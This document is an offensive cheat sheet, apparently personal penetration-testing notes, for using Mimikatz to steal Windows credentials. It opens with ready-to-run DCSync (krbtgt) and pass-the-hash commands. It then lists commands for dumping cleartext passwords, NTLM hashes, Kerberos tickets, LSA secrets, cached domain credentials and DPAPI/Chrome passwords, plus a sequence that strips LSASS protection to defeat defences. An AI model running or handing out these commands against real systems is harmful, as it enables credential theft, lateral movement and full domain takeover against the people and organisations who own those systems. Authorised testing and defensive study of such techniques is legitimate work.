```
lsadump::dcsync /domain:complyedge.com /user:krbtgt
```

```
sekurlsa::pth /user:jeff /domain:corp.com /ntlm:NTLMHASHnhb
```

# 🛠️ Mimikatz: Credentials It Can Capture

Mimikatz is a powerful tool for extracting credentials from Windows systems. Below is a breakdown of credential types it can capture, along with methods and formats.

---

## 🔐 1. Cleartext Passwords

- Extracted using:
  ```plaintext
  sekurlsa::logonpasswords
  ```
- Shows plaintext passwords **if**:
  - WDigest is enabled
  - User recently logged in and creds are still in memory

---

## 🧠 2. NTLM Hashes

- Extracted using:
  ```plaintext
  lsadump::sam
  sekurlsa::logonpasswords
  lsadump::lsa
  ```
- Usable in **Pass-the-Hash** attacks

---

## 🗝️ 3. Kerberos Tickets (TGT & TGS)

- Extracted using:
  ```plaintext
  sekurlsa::tickets
  kerberos::list
  ```
- Exportable as `.kirbi` files for **Pass-the-Ticket** attacks

---

## 💳 4. LSA Secrets

- Extracted via:
  ```plaintext
  lsadump::secrets
  ```
- May include:
  - Service account passwords
  - Scheduled task creds
  - Auto-logon creds

---

## 🔄 5. Cached Domain Credentials

- Extracted via:
  ```plaintext
  lsadump::cache
  ```
- Stored as **DCC2 (Domain Cached Credentials)** hashes

---

## 🔐 6. DPAPI Credentials

- Decrypted using:
  ```plaintext
  dpapi::masterkey
  dpapi::cred
  dpapi::chrome
  ```
- Targets:
  - Chrome saved passwords
  - Windows Credential Manager
  - RDP credentials

---

## 🖥️ 7. RDP Credentials

- Found in:
  - Credential Manager
  - `.rdp` files (if saved with credentials)
- Extracted using:
  ```plaintext
  sekurlsa::logonpasswords
  ```

---

## 🛂 8. Terminal Services Credentials

- Extracted with:
  ```plaintext
  ts::multirdp
  ts::logonpasswords
  ```

---

## 🔓 9. WDigest Credentials

- Extracted using:
  ```plaintext
  sekurlsa::wdigest
  ```
- Provides plaintext passwords if WDigest is **enabled**

---

## ⚙️ Requirements

- **Admin or SYSTEM privileges** required
- For `sekurlsa::*`, must have **SeDebugPrivilege**
- **Credential Guard**, **LSA Protection**, or **AV/EDR** may prevent extraction

## LSA protection override
```plaintext
!+
!processprotect /process:lsass.exe /remove
sekurlsa::logonpasswords
```

---

## 📋 Summary Table

| Credential Type          | Module/Command             | Format            |
|--------------------------|----------------------------|-------------------|
| Cleartext Passwords      | `sekurlsa::logonpasswords` | Plaintext         |
| NTLM Hashes              | `lsadump`, `sekurlsa`      | Hash              |
| Kerberos Tickets         | `kerberos`, `sekurlsa`     | `.kirbi` (Base64) |
| LSA Secrets              | `lsadump::secrets`         | Varies            |
| Cached Credentials       | `lsadump::cache`           | DCC2 Hash         |
| DPAPI Credentials        | `dpapi::*`                 | Decrypted strings |
| RDP Credentials          | `sekurlsa::logonpasswords` | Plaintext/Hash    |
| WDigest Passwords        | `sekurlsa::wdigest`        | Plaintext         |
